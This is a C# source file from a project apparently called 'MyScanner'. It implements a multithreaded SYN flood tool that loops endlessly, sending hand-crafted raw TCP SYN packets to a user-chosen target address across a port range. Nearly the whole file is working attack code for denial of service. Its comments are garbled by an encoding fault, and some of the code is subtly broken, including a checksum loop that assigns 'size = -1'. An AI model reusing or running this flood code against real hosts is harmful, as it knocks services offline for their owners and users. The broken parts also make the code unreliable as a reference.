using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace MyScanner.MyClasses
{
    /// <summary>
    /// SynFlood������
    /// </summary>
    class CSynFlood
    {
        public int startPort;
        public int endPort;
        public int threadOrder;         
        public string aimAddr;
        public int threadCount;         //���߳���
        public MyScanner.Scanner ui;
        public bool keepFlood;          //�Ƿ񱣳ֹ���
        public static long packetNum;   //���͵��ܰ���
        private int threadFinish;    //�߳������

        /// <summary>
        /// ��ʼ��
        /// </summary>
        /// <param name="UI"></param>
        /// <param name="threadOrder"></param>
        public CSynFlood(MyScanner.Scanner UI)
        {
            ui = UI;
            startPort = Convert.ToInt32(ui.TBStartPort.Text);
            endPort = Convert.ToInt32(ui.TBEndPort.Text);
            aimAddr = ui.aimIPAddress.Text.ToString();
            //this.threadOrder = threadOrder;
            this.threadCount = Scanner.threadCount;
            //ui.finishThread[threadOrder] = false;
        }

        /// <summary>
        /// ��ʼ��������
        /// </summary>
        public void BeginSynFlood()
        {
            keepFlood = true;
            packetNum = 0;
            threadFinish = 0;

            Thread[] floodThread = new Thread[threadCount];
            for (int i = 0; i < threadCount; i++)
            {
                floodThread[i] = new Thread(new ThreadStart(SendSynPackets));
                floodThread[i].Start();
            }

        }

        /// <summary>
        /// ֹͣ����
        /// </summary>
        public void StopSynFlood()
        {
            keepFlood = false;
        }

        /// <summary>
        /// ����TcySyn��
        /// </summary>
        /// <param name="aimAddr"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public void SendSynPackets()
        {
            //byte[] szSendBuf = new byte[100];
            try
            {
                //��ȡĿ��������Ϣ IP��ַ
                IPHostEntry ipAddr = Dns.GetHostByName(aimAddr);

                while (keepFlood)
                {
                    for (int port = startPort; port <= endPort; port++)
                    {
                        //ѭ��ɨ������˿�
                        IPEndPoint iep = new IPEndPoint(ipAddr.AddressList[0], port);
                        
                        try
                        {
                            #region ����TCP�� �°�
                            Random rand = new Random();
                            uint ip = Convert.ToUInt32(ipAddr.AddressList[0].Address);
                            syn synSock = new syn(ip, Convert.ToUInt16(port), iep, rand, Convert.ToByte(0x02));
                            synSock.synFS();
                            #endregion
                        }
                        catch (Exception ex)
                        {
                            UpdateTBResult(ui, ex.Message.ToString());
                        }
                        finally
                        {
                            //scanSock.Close();
                        }
                        //���㷢�Ͱ�������
                        packetNum++;
                    }
                }

            }
            catch
            {
            }

            threadFinish++;
            if (threadFinish == threadCount)
            {
                //�����߳�ȫ�����
                //packetNum = packetNum*threadCount;
                string ret = "SynFlood�������������� " + aimAddr + " ������ " +  packetNum.ToString() + " �����ݰ�\r\n";
                UpdateTBResult(ui, ret);
            }
        }


        /// <summary>
        /// ��psdHeaderʵ������Ϣת��Ϊbyte����
        /// </summary>
        /// <param name="psdHeader"></param>
        /// <returns></returns>
        private byte[] GetBytesFromPsdHeader(DataStructures.psd_header psdHeader)
        {
            int count = 0;
            int len = sizeof(int) + sizeof(int) + 2 + sizeof(ushort);
            byte[] ByteBuf = new byte[len];
            byte[] tmp;
            tmp = BitConverter.GetBytes(psdHeader.saddr);
            for (int j = 0; j < sizeof(int); j++)
            {
                ByteBuf[count++] = tmp[j];
            }
            tmp = BitConverter.GetBytes(psdHeader.daddr);
            for (int j = 0; j < sizeof(int); j++)
            {
                ByteBuf[count++] = tmp[j];
            }
            ByteBuf[count++] = psdHeader.mbz;
            ByteBuf[count++] = psdHeader.ptcl;
            for (int j = 0; j < sizeof(ushort); j++)
            {
                ByteBuf[count++] = tmp[j];
            }
            return ByteBuf;
        }

        /// <summary>
        /// ��TcpHeaderʵ������Ϣת��Ϊbyte����
        /// </summary>
        /// <param name="tcpHeader"></param>
        /// <returns></returns>
        private byte[] GetBytesFromTcpHeader(DataStructures.TCP_HEADER tcpHeader)
        {
            int count = 0;
            int len = sizeof(ushort) * 2 + sizeof(int) * 2 + 2 + sizeof(ushort) * 3;
            byte[] ByteBuf = new byte[len];
            byte[] tmp;
            tmp = BitConverter.GetBytes(tcpHeader.sourcePort);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(tcpHeader.destPort);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(tcpHeader.tcp_seq);
            for (int i = 0; i < sizeof(int); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(tcpHeader.tcp_ack);
            for (int i = 0; i < sizeof(int); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(tcpHeader.tcp_win);
            ByteBuf[count++] = tcpHeader.tcp_lenres;
            ByteBuf[count++] = tcpHeader.tcp_flags;
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(tcpHeader.tcp_checksum);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(tcpHeader.tcp_urp);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            return ByteBuf;
        }

        /// <summary>
        /// ��IPHeaderʵ������Ϣת��Ϊbyte����
        /// </summary>
        /// <param name="ipHeader"></param>
        /// <returns></returns>
        private byte[] GetBytesFromIPHeader(DataStructures.IP_HEADER ipHeader)
        {
            int count = 0;
            int len = sizeof(ushort) * 4 + sizeof(int) * 2 + 4;
            byte[] ByteBuf = new byte[len];
            byte[] tmp;
            ByteBuf[count++] = ipHeader.ver_hlen;
            ByteBuf[count++] = ipHeader.TOS;
            tmp = BitConverter.GetBytes(ipHeader.totalLen);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(ipHeader.ident);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(ipHeader.frag_and_flags);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            ByteBuf[count++] = ipHeader.ttl;
            ByteBuf[count++] = ipHeader.proto;
            tmp = BitConverter.GetBytes(ipHeader.checksum);
            for (int i = 0; i < sizeof(ushort); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(ipHeader.sourceIP);
            for (int i = 0; i < sizeof(int); i++)
            {
                ByteBuf[count++] = tmp[i];
            }
            tmp = BitConverter.GetBytes(ipHeader.destIP);
            for (int i = 0; i < sizeof(int); i++)
            {
                ByteBuf[count++] = tmp[i];
            }

            return ByteBuf;
        }

        /// <summary>
        /// ����У���
        /// ע�⣺buffer����Ϊ����ip�����飬��Ҫת����UInt16[];sizeΪbuffer����ĳ��ȡ�
        /// </summary>
        public static UInt16 checksum(UInt16[] buffer, int size)
        {
            Int32 cksum = 0;
            int counter;
            counter = 0;
            while (size > 0)
            {
                UInt16 val = buffer[counter];
                cksum += Convert.ToInt32(buffer[counter]);
                counter += 1;
                size = -1;
            }
            cksum = (cksum >> 16) + (cksum & 0xffff);
            cksum += (cksum >> 16);
            return (UInt16)(~cksum);
        }

        /// <summary>
        /// ��byte����ת��ΪUnit16����
        /// </summary>
        /// <param name="buffer"></param>
        /// <returns></returns>
        public UInt16[] byteToUshort(byte[] buffer)
        {
            int size = buffer.Length;
            ushort[] uBuffer = new ushort[size / 2];
            for (int i = 0; i < size; i += 2)
            {
                uBuffer[i / 2] = BitConverter.ToUInt16(buffer, i);
            }
            return uBuffer;
        }

        /// <summary>
        /// �������̸߳��½�����Ϣ��ί��
        /// </summary>
        /// <param name="ui"></param>
        /// <param name="txt"></param>
        public delegate void DeleUpdateTBResult(Scanner ui, string txt);

        /// <summary>
        /// ���̸߳��½�����Ϣ
        /// </summary>
        /// <param name="ui"></param>
        /// <param name="txt"></param>
        public void UpdateTBResult(Scanner ui, string txt)
        {
            if (ui.InvokeRequired)
            {
                Delegate d = new DeleUpdateTBResult(UpdateTBResult);
                ui.Invoke(d, new Object[] { ui, txt });
            }
            else
            {
                ui.TBResult.Text += txt;
            }
        }


        public class syn
        {
            private uint ip;
            private ushort port;
            private EndPoint ep;
            private Random rand;
            private Socket sock;
            private DataStructures.ipHeader iph;
            private DataStructures.psdHeader psh;
            private DataStructures.tcpHeader tch;
            public byte pFlag;
            public UInt16 checksum(UInt16[] buffer, int size)
            {
                Int32 cksum = 0;
                int counter;
                counter = 0;

                while (size > 0)
                {
                    UInt16 val = buffer[counter];

                    cksum += Convert.ToInt32(buffer[counter]);
                    counter += 1;
                    size -= 1;
                }

                cksum = (cksum >> 16) + (cksum & 0xffff);
                cksum += (cksum >> 16);
                return (UInt16)(~cksum);
            }
              
            public syn(uint _ip, ushort _port, EndPoint _ep, Random _rand, byte flag)
            {
                ip = _ip;
                port = _port;
                ep = _ep;
                rand = _rand;
                DataStructures.ipHeader iph = new DataStructures.ipHeader();
                psh = new DataStructures.psdHeader();
                tch = new DataStructures.tcpHeader();
                sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
                sock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, 1);
                //��2��ͦ��Ҫ�����������ſ����Լ��ṩipͷ  
                pFlag = flag;
            }

            /// <summary>
            /// �������Ķ��߳���Ҫ�õ������캯���Ķ���
            /// </summary>
            /// <param name="pFlag">��־λ���� 1ΪFin 2ΪSyn</param>
            unsafe public void synFS()
            {
                iph.ip_verlen = (byte)(4 << 4 | sizeof(DataStructures.ipHeader) / sizeof(uint));                //ipv4��20�ֽ�ipͷ������̶�����69  
                iph.ip_tos = 0;                //���0������  
                //�����ipͷ+tcpͷ�ܳ���40����С���ȣ�����tcp option��Ӧ����0028���ǻ��������ֽ������Ե���������2800  
                iph.ip_id = 0x9B18;                //�����������ie���͡�ֱ����������  
                iph.ip_offset = 0x40;                //���Ҳ������ie��  
                iph.ip_ttl = 64;                //Ҳ������ie�ģ�Ҳ������128ʲô�ġ�  
                iph.ip_protocol = 6;                //6����tcpЭ��  
                iph.ip_checksum = UInt16.Parse("0");                //û����֮ǰ��д0  
                iph.ip_destaddr = ip;                //ipͷ��Ŀ���ַ����Ҫ�����ĵ�ַ�����洫�����ġ�  
                psh.daddr = iph.ip_destaddr;                //αtcp�ײ�����У��ģ�������Ŀ�ĵ�ַ����ip���Ǹ�һ����  
                psh.mbz = 0;                //�����˵0����  
                psh.ptcl = 6;                //6��tcpЭ��  
                psh.tcpl = 0x1400;                //tcp�ײ��Ĵ�С��20�ֽڣ�Ӧ����0014�������ֽ���ԭ�����1400  
                byte[] rport = BitConverter.GetBytes(port); //��ת�˿ں� -by Hamvorinf
                Array.Reverse(rport);
                tch.th_dport = BitConverter.ToUInt16(rport, 0);                //�����˿ں�  
                tch.th_ack = 0;                //��һ�η�������û�з��������ص����кţ�Ϊ0  
                tch.th_lenres = (byte)((sizeof(DataStructures.tcpHeader) / 4 << 4 | 0));                //tcp����  
                tch.th_flag = pFlag;
                tch.th_win = ushort.Parse("16614");                //����ie��  
                tch.th_sum = UInt16.Parse("0");                //û����֮ǰ��Ϊ0  
                tch.th_urp = UInt16.Parse("0");                //�����ip����0���µĹ��������и����ֵ��  
                System.Net.IPAddress[] addressList = Dns.GetHostByName(Dns.GetHostName()).AddressList;
                iph.ip_srcaddr = Convert.ToUInt32(IPAddress.Parse(addressList[0].ToString()).Address);
                psh.saddr = iph.ip_srcaddr;
                ushort duankou = Convert.ToUInt16(16868);
                byte[] bt = BitConverter.GetBytes(duankou);
                Array.Reverse(bt);
                tch.th_sport = BitConverter.ToUInt16(bt, 0);
                tch.th_seq = IPAddress.HostToNetworkOrder((int)rand.Next(-2147483646, 2147483646));

                iph.ip_checksum = 0;
                tch.th_sum = 0;
                byte[] psh_buf = new byte[sizeof(DataStructures.psdHeader)];
                Int32 index = 0;
                index = pshto(psh, psh_buf, sizeof(DataStructures.psdHeader));
                if (index == -1)
                {
                    return;
                }
                index = 0;
                byte[] tch_buf = new byte[sizeof(DataStructures.tcpHeader)];
                index = tchto(tch, tch_buf, sizeof(DataStructures.tcpHeader));
                if (index == -1)
                {
                    return;
                }
                index = 0;
                byte[] tcphe = new byte[sizeof(DataStructures.psdHeader) + sizeof(DataStructures.tcpHeader)];
                Array.Copy(psh_buf, 0, tcphe, index, psh_buf.Length);
                index += psh_buf.Length;
                Array.Copy(tch_buf, 0, tcphe, index, tch_buf.Length);
                index += tch_buf.Length;
                tch.th_sum = chec(tcphe, index);
                index = 0;
                index = tchto(tch, tch_buf, sizeof(DataStructures.tcpHeader));
                if (index == -1)
                {
                    return;
                }
                index = 0;
                byte[] ip_buf = new byte[sizeof(DataStructures.ipHeader)];
                index = ipto(iph, ip_buf, sizeof(DataStructures.ipHeader));
                if (index == -1)
                {
                    return;
                }
                index = 0;
                byte[] iptcp = new byte[sizeof(DataStructures.ipHeader) + sizeof(DataStructures.tcpHeader)];
                Array.Copy(ip_buf, 0, iptcp, index, ip_buf.Length);
                index += ip_buf.Length;
                Array.Copy(tch_buf, 0, iptcp, index, tch_buf.Length);
                index += tch_buf.Length;
                iph.ip_checksum = chec(iptcp, index);
                index = 0;
                index = ipto(iph, ip_buf, sizeof(DataStructures.tcpHeader));
                if (index == -1)
                {
                    return;
                }
                index = 0;
                Array.Copy(ip_buf, 0, iptcp, index, ip_buf.Length);
                index += ip_buf.Length;
                Array.Copy(tch_buf, 0, iptcp, index, tch_buf.Length);
                index += tch_buf.Length;
                if (iptcp.Length != (sizeof(DataStructures.ipHeader) + sizeof(DataStructures.tcpHeader)))
                {
                    return;
                }
                //������һ��Ѷ������Ǽ���У��͵ķ����ˣ�������  
                //1������һ���ֽ����飬ǰ���tcpα�ײ������tcp�ײ���Ȼ����㣬ȷ������tcp���ֵ�У���  
                //2����ȷ����У��͵�tcp�ײ����������ֽ����飬���ǾͲ���tcpα�ײ��ˣ����Թ�20�ֽ�  
                //3����40�ֽ��ֽ����飬ǰ���ip�ײ��������tcp�ײ���У�飬ȷ������ip����У���  
                //4������ȷ����ipУ��͵�ip���ֺ�tcp�����Ⱥ����40�ֽڵ��ֽ������У�����Ҫ���͵�buffer[]�ˣ�������ô�鷳  
                try
                {
                    sock.SendTo(iptcp, ep);
                    //���췢���ֽ����������鷳�����;ͼ��ˣ�socket.sendto�Ϳ�����  
                }
                catch
                {
                    return;
                }
            }

            /// <summary>
            /// ����Ǽ���У�飬����Щ���Ͳ�һ����ȫתΪ16λ�ֽ������õ�
            /// </summary>
            /// <param name="buffer"></param>
            /// <param name="size"></param>
            /// <returns></returns>
            public UInt16 chec(byte[] buffer, int size)
            {
                Double double_length = Convert.ToDouble(size);
                Double dtemp = Math.Ceiling(double_length / 2);
                int cksum_buffer_length = Convert.ToInt32(dtemp);
                UInt16[] cksum_buffer = new UInt16[cksum_buffer_length];
                int icmp_header_buffer_index = 0;
                for (int i = 0; i < cksum_buffer_length; i++)
                {
                    cksum_buffer[i] =
                     BitConverter.ToUInt16(buffer, icmp_header_buffer_index);
                    icmp_header_buffer_index += 2;
                }
                UInt16 u_cksum = checksum(cksum_buffer, cksum_buffer_length);
                return u_cksum;
            }

            /// <summary>
            /// ����ǰ�ip����תΪ�ֽ������õ�
            /// </summary>
            /// <param name="iph"></param>
            /// <param name="Buffer"></param>
            /// <param name="size"></param>
            /// <returns></returns>
            public Int32 ipto(DataStructures.ipHeader iph, byte[] Buffer, int size)
            {
                Int32 rtn = 0;
                int index = 0;
                byte[] b_verlen = new byte[1];
                b_verlen[0] = iph.ip_verlen;
                byte[] b_tos = new byte[1];
                b_tos[0] = iph.ip_tos;
                byte[] b_totallen = BitConverter.GetBytes(iph.ip_totallength);
                byte[] b_id = BitConverter.GetBytes(iph.ip_id);
                byte[] b_offset = BitConverter.GetBytes(iph.ip_offset);
                byte[] b_ttl = new byte[1];
                b_ttl[0] = iph.ip_ttl;
                byte[] b_protol = new byte[1];
                b_protol[0] = iph.ip_protocol;
                byte[] b_checksum = BitConverter.GetBytes(iph.ip_checksum);
                byte[] b_srcaddr = BitConverter.GetBytes(iph.ip_srcaddr);
                byte[] b_destaddr = BitConverter.GetBytes(iph.ip_destaddr);
                Array.Copy(b_verlen, 0, Buffer, index, b_verlen.Length);
                index += b_verlen.Length;
                Array.Copy(b_tos, 0, Buffer, index, b_tos.Length);
                index += b_tos.Length;
                Array.Copy(b_totallen, 0, Buffer, index, b_totallen.Length);
                index += b_totallen.Length;
                Array.Copy(b_id, 0, Buffer, index, b_id.Length);
                index += b_id.Length;
                Array.Copy(b_offset, 0, Buffer, index, b_offset.Length);
                index += b_offset.Length;
                Array.Copy(b_ttl, 0, Buffer, index, b_ttl.Length);
                index += b_ttl.Length;
                Array.Copy(b_protol, 0, Buffer, index, b_protol.Length);
                index += b_protol.Length;
                Array.Copy(b_checksum, 0, Buffer, index, b_checksum.Length);
                index += b_checksum.Length;
                Array.Copy(b_srcaddr, 0, Buffer, index, b_srcaddr.Length);
                index += b_srcaddr.Length;
                Array.Copy(b_destaddr, 0, Buffer, index, b_destaddr.Length);
                index += b_destaddr.Length;
                if (index != size/* sizeof(IcmpPacket)   */)
                {
                    rtn = -1;
                    return rtn;
                }

                rtn = index;
                return rtn;

            }

            /// <summary>
            /// ����ǰ�tcpα�ײ�תΪ�ֽ������õ�
            /// </summary>
            /// <param name="psh"></param>
            /// <param name="buffer"></param>
            /// <param name="size"></param>
            /// <returns></returns>
            public Int32 pshto(DataStructures.psdHeader psh, byte[] buffer, int size)
            {
                Int32 rtn;
                int index = 0;
                byte[] b_psh_saddr = BitConverter.GetBytes(psh.saddr);
                byte[] b_psh_daddr = BitConverter.GetBytes(psh.daddr);
                byte[] b_psh_mbz = new byte[1];
                b_psh_mbz[0] = psh.mbz;
                byte[] b_psh_ptcl = new byte[1];
                b_psh_ptcl[0] = psh.ptcl;
                byte[] b_psh_tcpl = BitConverter.GetBytes(psh.tcpl);
                Array.Copy(b_psh_saddr, 0, buffer, index, b_psh_saddr.Length);
                index += b_psh_saddr.Length;
                Array.Copy(b_psh_daddr, 0, buffer, index, b_psh_daddr.Length);
                index += b_psh_daddr.Length;
                Array.Copy(b_psh_mbz, 0, buffer, index, b_psh_mbz.Length);
                index += b_psh_mbz.Length;
                Array.Copy(b_psh_ptcl, 0, buffer, index, b_psh_ptcl.Length);
                index += b_psh_ptcl.Length;
                Array.Copy(b_psh_tcpl, 0, buffer, index, b_psh_tcpl.Length);
                index += b_psh_tcpl.Length;
                if (index != size)
                {
                    rtn = -1;
                    return rtn;
                }
                else
                {
                    rtn = index;
                    return rtn;
                }

            }

            /// <summary>
            /// ����ǰ�tcp����תΪ�ֽ������õģ���Ϊ���Ҫ�õ�2�ξͲ��������α�ײ���һ����
            /// </summary>
            /// <param name="tch"></param>
            /// <param name="buffer"></param>
            /// <param name="size"></param>
            /// <returns></returns>
            public Int32 tchto(DataStructures.tcpHeader tch, byte[] buffer, int size)
            {
                Int32 rtn;
                int index = 0;
                byte[] b_tch_sport = BitConverter.GetBytes(tch.th_sport);
                byte[] b_tch_dport = BitConverter.GetBytes(tch.th_dport);
                byte[] b_tch_seq = BitConverter.GetBytes(tch.th_seq);
                byte[] b_tch_ack = BitConverter.GetBytes(tch.th_ack);
                byte[] b_tch_lenres = new byte[1];
                b_tch_lenres[0] = tch.th_lenres;
                byte[] b_tch_flag = new byte[1];
                b_tch_flag[0] = tch.th_flag;
                byte[] b_tch_win = BitConverter.GetBytes(tch.th_win);
                byte[] b_tch_sum = BitConverter.GetBytes(tch.th_sum);
                byte[] b_tch_urp = BitConverter.GetBytes(tch.th_urp);
                Array.Copy(b_tch_sport, 0, buffer, index, b_tch_sport.Length);
                index += b_tch_sport.Length;
                Array.Copy(b_tch_dport, 0, buffer, index, b_tch_dport.Length);
                index += b_tch_dport.Length;
                Array.Copy(b_tch_seq, 0, buffer, index, b_tch_seq.Length);
                index += b_tch_seq.Length;
                Array.Copy(b_tch_ack, 0, buffer, index, b_tch_ack.Length);
                index += b_tch_ack.Length;
                Array.Copy(b_tch_lenres, 0, buffer, index, b_tch_lenres.Length);
                index += b_tch_lenres.Length;
                Array.Copy(b_tch_flag, 0, buffer, index, b_tch_flag.Length);
                index += b_tch_flag.Length;
                Array.Copy(b_tch_win, 0, buffer, index, b_tch_win.Length);
                index += b_tch_win.Length;
                Array.Copy(b_tch_sum, 0, buffer, index, b_tch_sum.Length);
                index += b_tch_sum.Length;
                Array.Copy(b_tch_urp, 0, buffer, index, b_tch_urp.Length);
                index += b_tch_urp.Length;
                if (index != size)
                {
                    rtn = -1;
                    return rtn;
                }
                else
                {
                    rtn = index;
                    return rtn;
                }
            }
        }
    }
}
